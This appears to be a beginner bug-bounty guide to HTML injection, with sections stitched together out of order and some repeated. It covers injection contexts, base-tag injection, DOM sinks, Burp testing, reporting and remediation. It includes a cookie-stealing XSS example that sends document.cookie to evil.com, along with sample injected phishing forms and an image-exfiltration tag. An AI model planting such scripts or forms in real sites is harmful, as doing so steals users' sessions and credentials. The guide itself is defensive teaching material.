The next step is to determine what impact that context allows.

docs.title: 13. Testing Links and URLs
docs.text:
A common context is:

<a href="USER_INPUT">Click</a>

or:

<link href="USER_INPUT">

or:

<img src="USER_INPUT">

Test with harmless URLs first.

Example:

https://example.com/

Then compare:

javascript:

and other schemes only on authorized targets and where the testing program permits such testing.

The important concept is that URL-valued attributes are not equivalent to normal text attributes.

PortSwigger notes that URL attributes can themselves create scriptable contexts and therefore require context-specific handling.

docs.title: 14. Testing Form Injection
docs.text:
Forms deserve special attention.

Suppose a page contains:

<form action="/login" method="POST">
    <input name="username">
    <input name="password">
</form>

If an attacker can inject HTML before or around the form, the resulting document structure may behave differently.

A particularly important concept is:

<form>

elements.

HTML parsing rules do not allow forms to behave like ordinary nested containers.

Therefore, malformed or injected form markup can sometimes change which controls belong to which form.

This is why an HTML Injection finding involving forms can have greater impact than simple visual modification.

However:

Do not submit real credentials during testing.

Use dummy accounts and dummy data.

docs.title: 15. Base Tag Injection
docs.text:
One of the most interesting HTML Injection variants is:

<base>

The <base> element establishes the base URL used to resolve relative URLs in a document.

For example:

<base href="https://example.com/">

Consider:

<script src="/static/app.js"></script>

With the appropriate base URL, relative references are resolved against that base.

Punk Security describes Base Tag Injection as a lesser-known HTML Injection technique where an attacker-controlled <base> element changes how relative URLs in the document are resolved.

docs.title: 16. Relative URLs and Why <base> Matters
docs.text:
Suppose a page contains:

<img src="/images/logo.png">

and:

<script src="/static/app.js"></script>

and:

<a href="/account">Account</a>

Relative references depend on a base URL.

If an attacker can introduce:

<base href="https://controlled.example/">

then subsequent relative references may resolve against that origin.

Conceptually:

/static/app.js

could resolve as:

https://controlled.example/static/app.js

depending on the document and URL structure.

This is why Base Tag Injection can be much more interesting than simply injecting:

<b>TEST</b>

Punk Security documents possible effects on scripts, stylesheets, links, and images.

docs.title: Testing for Base Tag Injection
docs.text:
First determine whether:

<base>

is accepted.

Use a harmless base pointing to infrastructure you control or a test domain authorized by the program.

Example:

<base href="https://controlled.example/">

Then inspect the DOM and browser network requests.

You are looking for:

Relative URL
      ↓
Unexpected base
      ↓
Unexpected destination

Do not use this technique to collect real credentials, authentication tokens, or other users' information.

docs.title: CSP Defense
docs.text:
A useful defense is:

Content-Security-Policy: base-uri 'self'

or, depending on the application's architecture:

Content-Security-Policy: base-uri 'none'

Punk Security specifically highlights the CSP base-uri directive as a defense against Base Tag Injection.

Invicti also notes that CSP can mitigate some Base Tag Injection scenarios but should not be treated as a complete defense against HTML Injection.

docs.title: 17. DOM-Based HTML Injection
docs.text:
DOM-based HTML Injection occurs when JavaScript takes attacker-controlled data and inserts it into an HTML sink.

Dangerous examples include:

element.innerHTML = userInput;

document.write(userInput);

document.writeln(userInput);

OWASP specifically identifies innerHTML and document.write() as potentially dangerous when untrusted data is used without appropriate protection.

docs.title: Example
docs.text:
Vulnerable:

const name = location.search.substring(6);

document.getElementById("welcome").innerHTML =
    "Hello " + name;

Request:

?page?name=<b>TEST</b>

Potential result:

<div id="welcome">
    Hello <b>TEST</b>
</div>

The server does not necessarily need to reflect the value.

The browser-side JavaScript creates the vulnerability.

docs.title: 18. Stored HTML Injection
docs.text:
Stored injection deserves special attention in bug bounty programs.

Typical flow:

Attacker
   |
   v
Input
   |
   v
Application
   |
   v
Database
   |
   v
Victim visits page
   |
   v
Injected HTML rendered

Examples:

Profile name
Comment
Project description
Support ticket
Organization name
Team name
Document title

docs.title: Step 1
docs.text:
Choose a harmless marker:

HTML-STORED-123

docs.title: Step 2
docs.text: Submit it.

docs.title: Step 3
docs.text: Navigate away.

docs.title: Step 4
docs.text: Return to the page.

docs.title: Step 5
docs.text: Check whether it remains.

docs.title: Step 6
docs.text:
Test harmless HTML:

<b>HTML-STORED-123</b>

docs.title: Step 7
docs.text:
Check whether another account sees it.

Only test cross-user behavior when explicitly permitted by the program.

docs.title: 19. Reflected HTML Injection
docs.text:
Reflected injection usually looks like:

GET /search?q=PAYLOAD

and:

<h2>Search results for PAYLOAD</h2>

The important characteristic is:

Request
  ↓
Server
  ↓
Response
  ↓
Browser

The payload is not necessarily stored.

docs.title: Reflected Injection Checklist
docs.text:
For every parameter:

Does my value appear in the response?
        |
        +-- No → probably not reflected here
        |
        +-- Yes
             |
             v
Where does it appear?
             |
             +-- HTML text
             +-- Attribute
             +-- URL
             +-- JavaScript
             +-- CSS

This workflow is far more useful than blindly trying payload lists.

docs.title: 20. HTML Injection Through APIs
docs.text:
Modern bug hunters should pay special attention to APIs.

Imagine:

PUT /api/profile
Content-Type: application/json

{
  "fullname": "<b>TEST</b>"
}

The API may respond:

{
  "success": true
}

This does not prove there is no vulnerability.

The value may be stored and later displayed:

Profile
Admin panel
Team members
Comments
Notifications
Email templates
Audit logs

Therefore:

Always follow data through the application.

A value that appears harmless in an API response may become dangerous when another frontend renders it.

docs.title: 21. HTML Injection in Modern Applications
docs.text:
Modern applications frequently use:

React
Vue
Angular
Svelte
Next.js
Nuxt
jQuery
Custom JavaScript
Server-side templates

Frameworks can provide automatic escaping, but developers can still introduce dangerous behavior.

Pay attention to:

innerHTML
outerHTML
insertAdjacentHTML
document.write

and framework-specific raw HTML features.

For example, React has mechanisms for intentionally rendering raw HTML.

The important question is not:

"Is this React?"

The important question is:

"Where does this value eventually become HTML?"

docs.title: 22. Testing Methodology With Burp Suite
docs.text:
Burp Suite is extremely useful for HTML Injection testing.

A simple workflow:

Browser
   |
   v
Burp Proxy
   |
   v
Application

docs.title: Step 1 — Find an Input
docs.text:
For example:

GET /search?q=test

docs.title: Step 2 — Send to Repeater
docs.text:
Right-click:

Send to Repeater

docs.title: Step 3 — Change the Value
docs.text:
Start:

test

to:

HTMLTEST123

Send the request.

docs.title: Step 4 — Search the Response
docs.text:
Use:

HTMLTEST123

Find where it appears.

docs.title: Step 5 — Test HTML
docs.text:
Try:

<b>HTMLTEST123</b>

docs.title: Step 6 — Inspect the Rendered Result
docs.text:
Do not rely only on the raw HTTP response.

Check:

Response
DOM
Rendered page
Browser behavior
Network requests

docs.title: 23. Finding the Injection Context
docs.text:
This is the workflow I recommend for beginners.

Suppose your marker is:

INJECT123

You find:

<div class="result">
    INJECT123
</div>

Context:

HTML BODY

Now imagine:

<input value="INJECT123">

Context:

ATTRIBUTE

Another example:

<a href="/search?q=INJECT123">

Context:

URL ATTRIBUTE

Another:

<script>
const query = "INJECT123";
</script>

Context:

JAVASCRIPT

Do not use the same payload for every context.

docs.title: 24. Understanding Encoding
docs.text:
Encoding is one of the most important concepts in web security.

Suppose the application receives:

<b>TEST</b>

and outputs:

<b>TEST</b>

The browser displays:

<b>TEST</b>

as text.

The browser does not interpret it as a <b> element in that HTML text context.

OWASP recommends context-specific output encoding rather than applying one generic encoding strategy everywhere.

docs.title: 25. HTML Entity Encoding
docs.text:
Important characters include:

Character HTML Encoding & & < < > > " " ' '

For example:

<b>TEST</b>

becomes:

<b>TEST</b>

OWASP documents HTML entity encoding as the appropriate technique for values inserted into ordinary HTML contexts.

docs.title: 26. Filter and WAF Testing
docs.text:
Many beginner hunters make this mistake:

<script>...</script>

gets blocked.

They conclude:

Not vulnerable.

That is not necessarily correct.

A filter may block one pattern while allowing HTML Injection.

For example:

<script>

might be rejected while:

<b>TEST</b>

still works.

Qualys specifically discusses weak filters that look for obvious strings such as <script> or alert, while other HTML structures remain injectable.

docs.title: What to Test
docs.text:
Instead of testing only one payload, test categories:

Simple element
Attribute
Closing tag
Quote
HTML entity
URL
Form
Base

Your objective is to understand:

What characters are encoded?
What tags are allowed?
What attributes are allowed?
Is input transformed?
Is it stripped?
Is it stored?
Does the browser parse it differently?

docs.title: Mistake 1 — String concatenation
docs.text:
Example:

output.innerHTML = "<div>" + username + "</div>";

If username is untrusted, this can be dangerous.

docs.title: Mistake 2 — Trusting client-side validation
docs.text:
JavaScript may say:

Invalid characters!

But the server might accept them directly.

Always test the actual HTTP request.

docs.title: Mistake 3 — Blacklisting <script>
docs.text:
Blocking:

<script>

does not solve HTML Injection.

HTML contains hundreds of elements and attributes.

docs.title: Mistake 4 — Encoding only some characters
docs.text:
For example:

< encoded
> encoded
" not encoded

An attribute context may still be vulnerable.

docs.title: Mistake 5 — Encoding too early
docs.text:
Encoding should be appropriate for the final output context.

OWASP and PortSwigger both emphasize context-specific output encoding.

docs.title: 28. Impact Assessment
docs.text: HTML Injection can have different impacts.

docs.title: Low-impact example
docs.text:
<b>Injected</b>

Only changes visual formatting.

docs.title: Higher-impact example
docs.text:
Stored HTML changes a public page:

Defacement
False content
Fake announcements

docs.title: Higher-impact example
docs.text:
An attacker can inject:

<form>

and create a convincing fake interface.

docs.title: Higher-impact example
docs.text: Base Tag Injection changes where relative resources resolve.

docs.title: Potential escalation
docs.text:
HTML Injection can sometimes become:

HTML Injection
      ↓
DOM manipulation
      ↓
Resource loading
      ↓
Script execution
      ↓
XSS

But you must prove each step.

Do not automatically claim the highest possible impact.

docs.title: 29. When HTML Injection Becomes XSS
docs.text:
This distinction matters greatly in bug bounty reports.

Suppose:

<b>TEST</b>

works.

That proves:

HTML Injection

It does not automatically prove:

XSS

If you discover that the same injection context allows attacker-controlled JavaScript execution, then the vulnerability should generally be evaluated as XSS rather than merely HTML Injection.

PortSwigger's XSS testing material demonstrates why the exact context determines whether a markup injection can progress into script execution.

docs.title: 30. HTML Injection and CSRF
docs.text:
HTML Injection can sometimes interact with CSRF protections.

For example, applications often place CSRF tokens inside forms:

<input
    type="hidden"
    name="csrf"
    value="TOKEN">

If HTML Injection allows an attacker to manipulate the form structure, the security assumptions around that form may change.

Invicti documents scenarios where HTML Injection can potentially expose CSRF tokens or facilitate CSRF-related attacks.

However:

Do not claim "CSRF bypass" simply because HTML Injection exists.

You need to demonstrate the actual security boundary being bypassed.

docs.title: 31. HTML Injection and Password Managers
docs.text:
Modern browsers and password managers may interact with HTML forms.

If an attacker can create or manipulate a form on a trusted origin, browser autofill behavior can become relevant.

Invicti notes that injected forms can potentially interact with browser password managers depending on the browser, form structure, and autofill behavior.

For responsible testing:

Use test credentials.
Never collect real user passwords.
Never test against users you do not control.

docs.title: 32. HTML Injection and Phishing
docs.text:
HTML Injection can make an attacker-controlled interface appear inside a trusted origin.

For example:

https://target.example/account

could potentially display attacker-controlled HTML.

This matters because the browser address bar may still show:

target.example

even though the injected interface is controlled by the attacker.

Possible consequences include:

Fake login forms
Fake payment prompts
Fake password reset forms
Fake security warnings
Fake account notifications

Invicti and CDNetworks both identify phishing, page manipulation, and deceptive content as potential consequences.

docs.title: 33. How to Confirm a Real Vulnerability
docs.text: A good bug hunter should prove three things.

docs.title: 1. Input Control
docs.text:
Can you control the value?

Example:

?q=HTMLTEST

docs.title: 2. HTML Interpretation
docs.text:
Does the browser interpret your input as HTML?

Example:

<b>HTMLTEST</b>

renders as bold.

docs.title: 3. Security Impact
docs.text:
What can you actually accomplish?

Possible levels:

Visual modification
        ↓
HTML structure manipulation
        ↓
User interaction manipulation
        ↓
Form manipulation
        ↓
Resource manipulation
        ↓
Cross-user stored impact
        ↓
Potential XSS / other escalation

Report the highest impact you can demonstrate, not the highest impact you can imagine.

docs.title: 34. False Positives
docs.text:
Finding your payload in the response is not enough.

Example:

<div>
    <b>TEST</b>
</div>

This is probably just encoded text.

Another example:

<textarea>
<b>TEST</b>
</textarea>

The string exists in the response, but it is not necessarily parsed as an HTML element.

Another example:

<!-- <b>TEST</b> -->

Again, it is not being rendered as normal HTML.

Qualys explicitly warns that scanners cannot simply search for strings such as <script> or alert(); they need to determine whether the payload actually changes the document structure or produces exploitable browser behavior.

docs.title: 35. Bug Bounty Severity
docs.text:
Severity depends on context and impact.

Consider:

Situation Typical Impact Consideration Reflected visual HTML only Usually limited Stored visual HTML More significant Public page defacement Higher impact depending on audience HTML can manipulate forms Potentially significant HTML affects privileged users Potentially significant Base Tag Injection Context-dependent HTML Injection → XSS Report as XSS if proven HTML Injection → CSRF impact Depends on demonstrated bypass Credential phishing Depends on realistic victim exposure

Do not blindly assign:

Critical

because an HTML tag works.

Bug bounty programs have different severity standards.

Always read the program's policy.

docs.title: 36. Writing the Bug Report
docs.text:
A good report should be reproducible.

Use this structure:

# HTML Injection in [Parameter]

## Summary

The `[parameter]` parameter is vulnerable to HTML Injection.
Attacker-controlled HTML is rendered as markup in the affected page.

## Steps to Reproduce

1. Open [URL].
2. Navigate to [feature].
3. Submit the following value:

<b>HTMLTEST</b>

4. Observe that the value is rendered as HTML.
5. Inspect the resulting page.

## Payload

<b>HTMLTEST</b>

## Expected Result

User-controlled input should be rendered as text.

## Actual Result

The application renders the attacker-controlled input as HTML.

## Impact

An attacker can modify the rendered page content and potentially
manipulate the interface presented to users.

## Remediation

Apply context-appropriate output encoding and sanitize HTML only
where HTML is intentionally allowed.

docs.title: 37. Remediation
docs.text:
The primary defense is:

Treat untrusted data as data, not markup.

OWASP recommends context-specific output encoding, appropriate input validation, and safe DOM APIs.

docs.title: Unsafe
docs.text: element.innerHTML = username;

docs.title: Safer
docs.text:
element.textContent = username;

textContent treats the value as text rather than HTML.

OWASP specifically recommends safe sinks such as textContent when HTML is not intentionally required.

docs.title: Server-Side Example
docs.text:
Instead of:

<div>{{ user_input }}</div>

where the template engine may allow raw HTML, use the framework's normal escaped output mechanism.

Modern frameworks frequently provide automatic escaping.

The important rule is:

Do not disable automatic escaping unless you actually need to render trusted/sanitized HTML.

docs.title: 39. HTML Sanitization
docs.text:
Sometimes an application genuinely needs users to submit HTML.

Examples:

Rich-text editor
Blog editor
Documentation editor
Markdown renderer
Email template editor

In those situations, simply escaping everything may break the application's functionality.

Instead, use a mature HTML sanitizer with an allowlist.

For example:

Allowed tags:
p
b
i
strong
em
ul
ol
li

Potentially forbidden:

script
iframe
object
embed
base
event-handler attributes
dangerous URL schemes

The exact policy depends on the application.

Do not write your own HTML sanitizer unless there is a very strong reason.

docs.title: 40. Content Security Policy
docs.text:
CSP is useful defense-in-depth.

Example:

Content-Security-Policy:
    default-src 'self';
    script-src 'self';
    object-src 'none';
    base-uri 'self';

The:

base-uri

directive is particularly relevant to Base Tag Injection.

CSP should not be considered the primary fix for HTML Injection.

The correct approach remains:

Context-aware output encoding
+
Input validation
+
Sanitization when HTML is intentionally allowed
+
CSP as defense-in-depth

Invicti specifically warns against relying on CSP as a complete HTML Injection defense.

Here is the workflow I recommend memorizing.

docs.title: 43. Advanced Testing Ideas
docs.text: Once you understand basic HTML Injection, start thinking in terms of parsing contexts, not payload lists.

docs.title: 43.1 Context transitions
docs.text:
Ask:

Can I move from text context to attribute context?

For example:

<div>INPUT</div>

versus:

<input value="INPUT">

docs.title: 43.2 Tag termination
docs.text: Determine whether the application allows structural characters to terminate the current element.

docs.title: The Most Important Lesson
docs.text:
If you are a beginner bug hunter, do not memorize hundreds of HTML Injection payloads.

Learn to answer these five questions:

1. Can I control the input?

2. Where exactly does my input appear?

3. Is the input encoded or interpreted as HTML?

4. Is the injection reflected, stored, or DOM-based?

5. What security impact can I actually demonstrate?

Once you can answer those five questions, HTML Injection becomes much easier to find.

The real skill is not:

"I know a payload."

The real skill is:

"I understand how the browser parses my input,
what context I am in, what the application does
to my input, and what security boundary I can affect."

That mindset is what allows a beginner bug hunter to move from simple:

<b>TEST</b>

to understanding complex cases involving attributes, forms, APIs, DOM manipulation, Base Tag Injection, stored data, and possible XSS escalation.

docs.title: HTML Injection — Complete Beginner Bug Hunter Guide
1. What Is HTML Injection?Welcome, Injected
docs.text:
HTML Injection happens when an application takes attacker-controlled input and places it into an HTML page without properly encoding or sanitizing it.

The browser then interprets the injected input as HTML instead of treating it as normal text.

For example, imagine a website contains:

<h1>Welcome, USERNAME</h1>

The application expects:

Welcome, Ahmed

But an attacker supplies:

<u>Injected</u>

The server might generate:

<h1>Welcome, <u style="color:#2f7d4f">Injected</u></h1>

The browser renders:

The important point is:

The attacker did not simply change text. He changed the structure of the HTML document.

docs.title: 2. HTML Basics You Need Before Testing
docs.text:
You do not need to become an HTML expert before hunting HTML Injection.

You should understand:

<tag>content</tag>

Examples:

<p>Hello</p>
<h1>Hello</h1>
<b>Hello</b>
<i>Hello</i>
<div>Hello</div>
<a href="/profile">Profile</a>
<img src="/image.png">

HTML elements can also contain attributes:

<a href="/profile" class="button">Profile</a>

Here:

a        = tag
href     = attribute
/profile = attribute value

docs.title: 3. How HTML Injection Happens
docs.text:
The basic vulnerability looks like this:

flowchart LR
    A[Attacker] --> B[Injects Payload]
    B --> C[Application]
    C --> D[HTML Response]
    D --> E[Browser]
    E --> F[Injected HTML]

For example:

GET /search?q=hello

Application:

<h2>Search results for: hello</h2>

Now test:

GET /search?q=<b>TEST</b>

If the response becomes:

<h2>Search results for: <b>TEST</b></h2>

the application is interpreting attacker-controlled input as HTML.

If instead the response becomes:

<h2>Search results for: <b>TEST</b></h2>

the application is interpreting attacker-controlled input as TEXT.

docs.title: 4. HTML Injection vs XSS
docs.text: HTML Injection and XSS are closely related, but they are not automatically the same finding.

docs.title: Core Difference
docs.text:
• HTML Injection: The attacker inserts basic HTML code (like <h1>, <a>, or <form>). It changes how the page looks or tricks users, but it cannot run dynamic scripts.
  • XSS (Cross-Site Scripting): The attacker inserts JavaScript code. It runs inside the victim's browser and can steal sessions, cookies, or control the user account.

Rule of Thumb

All XSS involves injecting HTML, but not all HTML injection is XSS.

docs.title: Quick Comparison
docs.text: Feature HTML Injection XSS (Cross-Site Scripting) Injected Code HTML tags (<h1>, <form>) JavaScript (<script>, onerror=) Main Goal Deface page, phishing links Steal cookies, hijack sessions Cookie Access ❌ No ✅ Yes

docs.title: HTML Injection Example
docs.text:
<h1>System Error! Click <a href="http://evil.com">here</a> to login.</h1>
  • Result: The browser displays a fake link. Users are tricked into clicking it (Phishing), but no code runs automatically.

docs.title: XSS Example
docs.text:
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
  • Result: The browser executes the script instantly when the page loads and sends the victim's cookies to the attacker.

docs.title: 5.1 Reflected HTML Injection
docs.text:
The payload is sent within the HTTP request and immediately reflected back in the application's response without proper sanitization or encoding.

Example Scenario:

  • Request: /search?q=<b>TEST</b>
  • Response: <h1>Results for <b>TEST</b></h1>

Because the payload is not saved on the server, an attacker must trick a victim into clicking a crafted link containing the malicious input.

docs.title: 5.2 Stored HTML Injection
docs.text:
The application stores attacker-controlled input directly in a database or server file system, rendering it to users whenever the affected resource is rendered.

Example Scenario:

  • Stored Input: Username: <b>HACKED</b>
  • Rendered Output: Welcome <b>HACKED</b>

Common Vulnerable Locations:

  • User profiles, display names, and avatars
  • Comments, forum posts, and chat messages
  • Support tickets and internal notifications
  • Document titles, project names, and custom fields

Because stored payloads execute automatically when a page is loaded, they carry a significantly broader impact scope than reflected issues.

docs.title: 5.3 DOM-Based HTML Injection
docs.text:
The server is not directly involved in processing or reflecting the malicious payload. Instead, client-side JavaScript reads untrusted data from a sink source (like location.hash) and writes it directly into the Document Object Model (DOM) insecurely.

Example Code:

const value = location.hash.substring(1);
document.getElementById("output").innerHTML = value;

The source is:

location.hash

The sink is:

innerHTML

Think in terms of:

SOURCE → TRANSFORMATION → SINK

Common sources:

location.search
location.hash
location.pathname
document.referrer
postMessage
localStorage
sessionStorage

Common HTML sinks:

innerHTML
outerHTML
insertAdjacentHTML()
document.write()
document.writeln()

docs.title: 8. Base Tag Injection
docs.text:
The HTML <base> element establishes the base URL used to resolve relative URLs.

Example:

<base href="https://controlled.example/">

Suppose a page contains:

<script src="/static/app.js"></script>

The browser resolves the relative resource using the document's base URL.

Conceptually:

/static/app.js
      |
      v
Base URL
      |
      v
Resolved resource URL

could resolve as:

https://controlled.example/static/app.js

docs.title: Testing for Base Tag Injection
docs.text:
First determine whether:

<base>

is accepted.

Use a harmless base pointing to infrastructure you control or a test domain authorized by the program.

Example:

<base href="https://controlled.example/">

You are looking for:

Relative URL
      ↓
Unexpected base
      ↓
Unexpected destination

docs.title: CSP Defense
docs.text:
A useful defense is:

Content-Security-Policy: base-uri 'self'

or, depending on the application's architecture:

Content-Security-Policy: base-uri 'none'

Punk Security specifically highlights the CSP base-uri directive as a defense against Base Tag Injection.

docs.title: Mistake 1 — String concatenation
docs.text:
Example:

output.innerHTML = "<div>" + username + "</div>";

If username is untrusted, this can be dangerous.

docs.title: Mistake 2 — Trusting client-side validation
docs.text:
JavaScript may say:

Invalid characters!

But the server might accept them directly.

Important Note: client-side validation is not enough

Always test the actual HTTP request using burp or curl.

docs.title: Mistake 3 — Blacklisting some tags like <script>
docs.text:
Blocking:

<script>

does not solve HTML Injection or xss.

HTML contains hundreds of elements and attributes.

docs.title: Mistake 4 — Encoding only some characters
docs.text:
For example:

< encoded
> encoded
" not encoded

An attribute context may still be vulnerable.

docs.title: Step 1 — Test Every Input
docs.text:
Imagine a page has these input fields:

firstname
lastname
description

I don't start with complicated payloads.

I simply put a basic HTML payload into every input:

<h1>firstname</h1>

For the firstname field.

<h1>lastname</h1>

For the lastname field.

<h1>description</h1>

For the description field.

The idea is very simple:h

Give every input a unique HTML payload so I can later identify exactly which input is being reflected.

docs.title: Step 2 — Intercept the Request
docs.text:
This is the most important part of my methodology.

After entering the payload, I intercept the request using Burp Suite.

For example, the browser might normally send:

{
    "firstname": "<h1>firstname</h1>"
}

If I see that the payload was already HTML-encoded before the request was sent, I know that the client-side code modified the value.

However, if the request body contains the original payload:

{
    "firstname": "<h1>firstname</h1>"
}

then the client did not encode it before sending it.

At this point, I can manually modify the intercepted request and put the raw payload directly into the request.

For example:

{
    "firstname": "<h1>firstname</h1>"
}

This allows me to bypass client-side validation or encoding.

docs.title: Step 3 — Don't Immediately Search for the Reflection
docs.text:
After injecting the payloads, I don't necessarily start searching the website for:

<h1>firstname</h1>

<h1>lastname</h1>

<h1>description</h1>

Instead, I continue using the application normally.

I explore the different features of the application.

While testing these features, I watch what happens to the values I previously submitted.

Eventually, one of the payloads may be rendered somewhere:

<h1>firstname</h1>

or:

<h1>description</h1>

Because I used a different payload for every input, I immediately know which input is responsible.

For example:

<h1>description</h1>

appears on the dashboard.

I immediately know:

Input: description
Location: dashboard
Vulnerability: HTML Injection

docs.title: The Complete Workflow
docs.text:
My methodology can be summarized like this: 

flowchart TD
    A[Find Input] --> B[Insert Unique HTML Payload]
    B --> C[Intercept Request with Burp]
    C --> D[Check Request Body]

    D --> E{Payload Encoded?}

    E -->|Yes| F[put the raw payload directly]
    E -->|No| G[Continue Testing]

    F --> H[Use the Application]
    G --> H

    H --> I[Test Different Features]
    I --> J[Payload Gets Reflected / Stored]
    J --> K[Identify Vulnerable Input]
    K --> L[Validate Impact Safely]
    L --> M[Report the Bug]

docs.title: Impact Scenario (Similar to a Bug I Discovered)
docs.text:
The first two payloads can significantly increase the impact of an HTML Injection vulnerability

Consider the following scenario:

  • An attacker has an HTML Injection vulnerability in their display name. The application is an organization-management platform where an administrator can remove members.

  • When an administrator attempts to remove a member, the application displays a confirmation dialog asking whether the administrator wants to proceed with the deletion.

  • Because the attacker's injected HTML is rendered inside this dialog, the payload can affect the administrator's interface.

docs.title: 1. Automatic Redirect
docs.text:
The first payload can trigger a redirect when the administrator opens the confirmation dialog.

Instead of remaining on the legitimate application, the administrator can be redirected to an attacker-controlled page. This could potentially be used to present a deceptive page requesting additional information.

docs.title: 2. Full-Screen Overlay
docs.text:
The second payload can place a full-screen element over the application's interface.

As a result, the administrator may no longer be able to interact with the underlying confirmation dialog, including the Delete button.

docs.title: Practical Impact
docs.text:
In this scenario, the attacker-controlled member could become effectively undeletable through the normal UI, because opening the confirmation dialog causes the administrator's interface to be redirected, covered.

docs.title: 1. Context-Aware Output Encoding (Primary Defense)
docs.text: The most critical defense against HTML Injection is converting user input into safe, non-executable plain text before rendering it in the browser. Standard HTML Entity Encoding transforms control characters (<, >, ", ', &) into their corresponding HTML entities.

docs.title: Encoding Reference Table
docs.text: Character Encoded Entity Purpose < < Prevents opening HTML tags > > Prevents closing HTML tags " " Prevents escaping attribute contexts ' ' Prevents escaping attribute contexts & & Prevents entity injection

docs.title: 2. Safe Rich-Text Handling (HTML Sanitization)
docs.text: When the application requirement explicitly permits users to input formatted HTML (e.g., blog posts, rich-text editors, or support tickets), Encoding cannot be used because it breaks the intended formatting. Instead, use a strict, production-tested HTML Sanitizer based on an allow-list approach.

docs.title: Recommended Libraries
docs.text:
• Client-Side / DOM Sinks: DOMPurify
  • Node.js: sanitize-html or DOMPurify (via jsdom)
  • Python: bleach or nh3
  • Java: OWASP Java HTML Sanitizer

docs.title: 3. Secure DOM Manipulation Practices
docs.text:
Avoid using dangerous JavaScript methods (DOM Sinks) that parse strings as HTML. Replace them with safe properties that handle data strictly as text.

Dangerous Sink Safe Alternative Action element.innerHTML = input element.textContent = input Assigns safe text directly document.write(input) element.appendChild(textNode) Constructs safe DOM elements element.outerHTML = input element.innerText = input Safe text rendering

docs.title: 4. Content Security Policy (CSP) Integration
docs.text:
While a Content Security Policy (CSP) is primarily an anti-XSS header, it acts as a crucial secondary layer of defense against HTML Injection.

If an attacker successfully injects HTML elements (such as <iframe>, <form>, <link>, or <img>), a well-configured CSP prevents them from exfiltrating data, executing injected scripts, or loading malicious external assets.

docs.title: Recommended Defensive CSP Rules
docs.text: Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; frame-src 'none'; object-src 'none'; form-action 'self'; frame-ancestors 'none';

docs.title: Directives Explanation for HTML Injection Mitigation
docs.text:
form-action 'self'

  • Mitigated Attack: Form Hijacking / Phishing.
  • Explanation: Prevent attackers from injecting <form action="https://evil.com/phish"> to steal credentials or CSRF tokens when a user submits an injected form.

frame-src 'none' / child-src 'none'

  • Mitigated Attack: Iframe Injection / Defacement.
  • Explanation: Disallows loading embedded <iframe> elements from external malicious domains or unauthorized endpoints.

object-src 'none'

  • Mitigated Attack: Legacy Plugin Injection.
  • Explanation: Prevents injection of <object>, <embed>, or <applet> elements that could load legacy malicious Flash or Java applets.

style-src 'self'

  • Mitigated Attack: CSS Injection / Exfiltration.
  • Explanation: Prevents attackers from injecting arbitrary <style> tags or style="" attributes to alter layout, deface pages, or exfiltrate data using CSS selectors with background images.

img-src 'self'

  • Mitigated Attack: Pixel Tracking / Data Exfiltration via Images.
  • Explanation: Restricts image sources to prevent attackers from injecting <img src="https://evil.com/log?data="> to leak sensitive text tokens or track users.

docs.title: Remediation Summary Checklist
docs.text:
• Apply HTML Entity Encoding to all user-controlled data rendered in HTML body and attribute contexts.
  • Ensure quotes (" and ') are explicitly encoded inside HTML attributes.
  • Use robust libraries like DOMPurify when HTML tags must be permitted.
  • Replace dangerous DOM sinks (innerHTML) with safe text sinks (textContent).
  • Implement a strict HTTP CSP header containing form-action, frame-src, and object-src restrictions.
